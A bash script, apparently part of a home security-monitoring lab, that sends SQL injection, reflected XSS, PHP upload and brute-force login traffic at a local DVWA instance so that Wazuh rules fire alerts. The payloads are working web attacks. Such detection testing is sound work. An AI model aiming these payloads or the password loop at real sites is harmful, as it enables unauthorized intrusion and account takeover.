#!/bin/bash
# ============================================================================
# Mini SOC Attack Simulator Script
# ============================================================================
# Purpose: Execute automated attack scenarios for demonstration
# Usage: ./attack.sh
# ============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
DVWA_URL="http://localhost:8080"
ATTACK_DELAY=2

echo "═══════════════════════════════════════════════════════════════════════"
echo "  Mini SOC - Automated Attack Simulator"
echo "═══════════════════════════════════════════════════════════════════════"
echo ""

# Check if DVWA is accessible
echo -e "${BLUE}[*] Checking DVWA connectivity...${NC}"
if ! curl -s "$DVWA_URL" > /dev/null; then
    echo -e "${RED}[!] Cannot reach DVWA at $DVWA_URL${NC}"
    echo -e "${RED}[!] Make sure to run: docker-compose up -d${NC}"
    exit 1
fi
echo -e "${GREEN}[+] DVWA is accessible${NC}"

echo ""
echo "Select attack scenarios to execute:"
echo "1. SQL Injection (SQLi)"
echo "2. Cross-Site Scripting (XSS)"
echo "3. File Upload"
echo "4. Brute Force"
echo "5. All Attacks"
echo "6. Exit"
echo ""
read -p "Enter your choice (1-6): " choice

case $choice in
    1)
        echo ""
        echo -e "${YELLOW}[*] Starting SQL Injection attacks...${NC}"
        
        echo -e "${BLUE}[*] Attack 1: Authentication Bypass${NC}"
        curl -s "$DVWA_URL/vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271" > /dev/null
        echo -e "${GREEN}[+] Payload sent: admin' OR '1'='1${NC}"
        sleep $ATTACK_DELAY
        
        echo -e "${BLUE}[*] Attack 2: UNION-based SQLi${NC}"
        curl -s "$DVWA_URL/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%28%29%2Cdatabase%28%29%20--" > /dev/null
        echo -e "${GREEN}[+] Payload sent: 1' UNION SELECT user(),database() --${NC}"
        sleep $ATTACK_DELAY
        
        echo -e "${BLUE}[*] Attack 3: Data Extraction${NC}"
        curl -s "$DVWA_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%20--" > /dev/null
        echo -e "${GREEN}[+] Payload sent: 1' OR '1'='1 --${NC}"
        sleep $ATTACK_DELAY
        
        echo ""
        echo -e "${GREEN}[+] SQL Injection attacks completed${NC}"
        echo -e "${YELLOW}[*] Check Wazuh Dashboard for Rule ID: 100100 alerts${NC}"
        ;;
        
    2)
        echo ""
        echo -e "${YELLOW}[*] Starting Cross-Site Scripting attacks...${NC}"
        
        echo -e "${BLUE}[*] Attack 1: Basic Script Injection${NC}"
        curl -s -L "$DVWA_URL/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%20Test%27%29%3C%2Fscript%3E" > /dev/null
        echo -e "${GREEN}[+] Payload sent: <script>alert('XSS Test')</script>${NC}"
        sleep $ATTACK_DELAY
        
        echo -e "${BLUE}[*] Attack 2: Event Handler Injection${NC}"
        curl -s -L "$DVWA_URL/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E" > /dev/null
        echo -e "${GREEN}[+] Payload sent: <img src=x onerror=alert('XSS')>${NC}"
        sleep $ATTACK_DELAY
        
        echo -e "${BLUE}[*] Attack 3: Cookie Stealer${NC}"
        curl -s -L "$DVWA_URL/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E" > /dev/null
        echo -e "${GREEN}[+] Payload sent: <script>alert(document.cookie)</script>${NC}"
        sleep $ATTACK_DELAY
        
        echo ""
        echo -e "${GREEN}[+] XSS attacks completed${NC}"
        echo -e "${YELLOW}[*] Check Wazuh Dashboard for Rule ID: 100200 alerts${NC}"
        ;;
        
    3)
        echo ""
        echo -e "${YELLOW}[*] Starting File Upload attacks...${NC}"
        
        # Create test files
        echo "<?php echo 'Uploaded successfully'; ?>" > /tmp/test.php
        echo "test content" > /tmp/test.txt
        
        echo -e "${BLUE}[*] Attack 1: PHP File Upload${NC}"
        curl -s -F "uploaded_file=@/tmp/test.php" "$DVWA_URL/vulnerabilities/upload/" > /dev/null
        echo -e "${GREEN}[+] PHP file uploaded${NC}"
        sleep $ATTACK_DELAY
        
        echo -e "${BLUE}[*] Attack 2: Text File Upload${NC}"
        curl -s -F "uploaded_file=@/tmp/test.txt" "$DVWA_URL/vulnerabilities/upload/" > /dev/null
        echo -e "${GREEN}[+] TXT file uploaded${NC}"
        sleep $ATTACK_DELAY
        
        # Cleanup
        rm -f /tmp/test.php /tmp/test.txt
        
        echo ""
        echo -e "${GREEN}[+] File upload attacks completed${NC}"
        echo -e "${YELLOW}[*] Check Wazuh Dashboard for Rule ID: 100300 alerts${NC}"
        ;;
        
    4)
        echo ""
        echo -e "${YELLOW}[*] Starting Brute Force attacks...${NC}"
        
        PASSWORDS=("password" "admin" "123456" "dvwa" "wrong")
        
        for i in {1..5}; do
            for pass in "${PASSWORDS[@]}"; do
                echo -e "${BLUE}[*] Attempt $i: admin:$pass${NC}"
                curl -s -X POST "$DVWA_URL/vulnerabilities/brute/" \
                    -d "username=admin&password=$pass&Login=Login" > /dev/null
                sleep 1
            done
        done
        
        echo ""
        echo -e "${GREEN}[+] Brute Force attacks completed${NC}"
        echo -e "${YELLOW}[*] Check Wazuh Dashboard for Rule ID: 100400 alerts${NC}"
        ;;
        
    5)
        echo ""
        echo -e "${YELLOW}[*] Starting ALL attack scenarios...${NC}"
        echo ""
        
        # Run all attacks
        bash "$0" << EOF
1
EOF
        sleep 5
        
        bash "$0" << EOF
2
EOF
        sleep 5
        
        bash "$0" << EOF
3
EOF
        sleep 5
        
        bash "$0" << EOF
4
EOF
        
        echo ""
        echo -e "${GREEN}[+] All attack scenarios completed!${NC}"
        ;;
        
    6)
        echo -e "${YELLOW}[*] Exiting...${NC}"
        exit 0
        ;;
        
    *)
        echo -e "${RED}[!] Invalid choice${NC}"
        exit 1
        ;;
esac

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo -e "${GREEN}Attacks sent successfully!${NC}"
echo ""
echo "Next steps:"
echo "1. Access Wazuh Dashboard: https://localhost:5601"
echo "2. Navigate to: Security Events"
echo "3. Check for alerts matching your attack scenarios"
echo "4. Filter by Rule ID to see specific attacks"
echo ""
echo "Expected Alert Rule IDs:"
echo "  - SQLi: 100100, 100101, 100102"
echo "  - XSS: 100200, 100201, 100202"
echo "  - File Upload: 100300, 100301"
echo "  - Brute Force: 100400, 100401"
echo ""
echo "═══════════════════════════════════════════════════════════════════════"
